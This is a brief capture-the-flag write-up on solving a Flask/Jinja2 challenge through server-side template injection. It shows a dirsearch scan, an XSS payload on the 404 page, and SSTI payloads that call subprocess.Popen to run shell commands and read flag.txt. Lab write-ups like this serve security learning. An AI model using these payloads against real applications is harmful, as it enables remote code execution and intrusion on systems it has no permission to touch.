# Templated

- Difficulty: Easy
- Points: 20

## Steps I took to solve it

### 1. Inspect the site

I inpected the page and I have this information:

- The application uses Flask/Jinja2.
- The server is using Werkzeug/1.0.1 Python/3.9.0
- There is not robots.txt

Not alot, but this information is important.

### 2. Running dirsearch

I ran the following command: `dirsearch -u http://206.189.125.80:31875 -w ~/.git_pkgs/SecLists/Discovery/Web-Content/dirsearch.txt -o ./scans/dirseach-scans.txt` in order to scan any potential directories that could this flask app contain.

### 3. 404 Page

In the meanwhile I checked if the 404 page had XSS (which it has: `http://<FLASK_IP>:<FLASK_PORT>/<img src=x onerror='alert("XSS")'>`). The XSS made me think if I can use the same attack vector to exploit a potential Jinja SSTI (Server-Side Template Injection). After requesting the following resource: `http://<SITE>/{{ 1 + 1 }}`, I got `Page '2' could not be found`. 

### 4. Server-Side Template Injection

I read about SSTI for a bit and done the following things:

- `http://<SITE>/{{ [].__class__.__base__.__subclasses() }}` gave me a list of classes and modules used within the application.
- After inspecting the result, I found `<class 'subprocess.Popen' >` at index 414.
- `http://<SITE>/{{ [].__class__.__base__.__subclasses__()[414]("<command>", shell=True, stdout=-1).communicate() }}` allowed me to gain RCE.

I got the flag by using the following payload: `{{ [].__class__.__base__.__subclasses__()[414]("cat flag.txt", shell=True, stdout=-1).communicate() }}`.